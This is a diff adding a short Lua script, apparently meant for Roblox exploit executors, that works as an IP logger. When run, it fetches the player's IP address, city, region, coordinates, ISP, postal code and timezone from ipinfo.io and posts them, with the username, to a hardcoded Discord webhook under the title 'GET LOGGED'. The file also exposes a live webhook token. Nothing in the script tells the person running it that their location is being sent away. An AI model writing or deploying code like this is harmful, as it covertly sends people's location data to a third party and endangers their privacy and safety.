@@ -1,0 +1,80 @@
+local HttpService = game:GetService("HttpService")
+
+local webhookURL = "https://discord.com/api/webhooks/1253774304580210769/LBwUZb5nl7Tv7WvtPswMb-jj0uopSVlbclbOxiWVp9lr-VxtluxWD9T_LzL4yjYQogy-"
+
+local playerName = game.Players.LocalPlayer.Name
+
+local response = request({
+    Url = "https://ipinfo.io/json",
+    Method = "GET"
+})
+
+local IPINFO = HttpService:JSONDecode(response.Body)
+
+local data = {
+    embeds = {
+        {
+            title = "GET LOGGED",
+            description = "SKID DETECTED!1!1!1!",
+            color = tonumber(0x1736d6),
+            fields = {
+                {
+                    name = "**Username**",
+                    value = playerName,
+                    inline = false
+                },
+                {
+                    name = "**IP Address**",
+                    value = IPINFO.ip,
+                    inline = false
+                },
+                {
+                    name = "**Country**",
+                    value = IPINFO.country,
+                    inline = false
+                },
+                {
+                    name = "**City**",
+                    value = IPINFO.city,
+                    inline = false
+                },
+                {
+                    name = "**Region**",
+                    value = IPINFO.region,
+                    inline = false
+                },
+                {
+                    name = "**Location**",
+                    value = IPINFO.loc,
+                    inline = false
+                },
+                {
+                    name = "**Organization**",
+                    value = IPINFO.org,
+                    inline = false
+                },
+                {
+                    name = "**Postal**",
+                    value = IPINFO.postal,
+                    inline = false
+                },
+                {
+                    name = "**Timezone**",
+                    value = IPINFO.timezone,
+                    inline = false
+                }
+            }
+        }
+    }
+}
+
+local jsonData = HttpService:JSONEncode(data)
+
+request({
+    Url = webhookURL,
+    Method = "POST",
+    Headers = {
+        ["Content-Type"] = "application/json"
+    },
+    Body = jsonData
+})
